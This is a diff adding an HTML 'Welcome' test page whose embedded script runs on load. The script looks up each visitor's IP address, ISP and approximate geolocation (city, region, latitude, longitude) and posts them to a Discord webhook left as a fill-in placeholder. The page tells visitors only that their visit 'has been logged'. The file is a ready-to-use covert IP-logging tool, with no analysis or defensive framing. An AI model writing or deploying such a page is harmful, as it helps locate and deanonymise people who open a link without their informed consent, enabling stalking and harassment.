@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Welcome</title>
+</head>
+<body>
+  <h2>Welcome to the test page</h2>
+  <p>Your visit has been logged.</p>
+
+  <script>
+    const webhookURL = "YOUR_DISCORD_WEBHOOK_URL_HERE"; // Replace this
+
+    // Fetch IP and location info
+    fetch("https://ipapi.co/json/")
+      .then(response => response.json())
+      .then(data => {
+        const ipInfo = `
+📡 New Visitor Logged
+------------------------
+🌐 IP: ${data.ip}
+🏙️ City: ${data.city}
+🌍 Country: ${data.country_name}
+🕹️ ISP: ${data.org}
+🧭 Region: ${data.region}
+📍 Latitude: ${data.latitude}
+📍 Longitude: ${data.longitude}
+🧠 Timezone: ${data.timezone}
+        `;
+
+        // Send to Discord
+        fetch(webhookURL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ content: ipInfo })
+        });
+      })
+      .catch(err => {
+        console.error("Error fetching IP data:", err);
+      });
+  </script>
+</body>
+</html>
